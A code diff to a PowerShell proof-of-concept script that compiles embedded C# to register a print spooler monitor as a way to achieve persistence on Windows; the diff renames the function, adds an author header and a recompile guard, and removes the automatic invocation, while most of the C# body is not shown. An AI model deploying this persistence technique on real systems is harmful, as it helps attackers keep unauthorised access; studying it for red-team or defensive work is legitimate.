@@ -1,5 +1,12 @@
-function Add-Monitor {
-$ProgramVariable = @"
+function Add-SpoolMonitor {
+  <#
+  @AUTHOR: Bret McDanel
+  .SYNOPSIS
+  Adds a spool monitor, PoC to demonstrate a way to achieve persistence
+  .DESCRIPTION
+  Adds a spool monitor, PoC to demonstrate a way to achieve persistence
+  #>
+  $ProgramVariable = @"
 using System;
 using System.Runtime.InteropServices;
 namespace Persist
@@ -29,8 +36,8 @@ namespace Persist
 }
 "@
 
-Add-Type -TypeDefinition $ProgramVariable -Language CSharp
-Invoke-Expression "[Persist.Program]::Main()"
+  if (-not ([System.Management.Automation.PSTypeName]'Persist.Program').Type) {
+    Add-Type -TypeDefinition $ProgramVariable -Language CSharp
+  }
+  Invoke-Expression "[Persist.Program]::Main()"
 }
-
-Add-Monitor
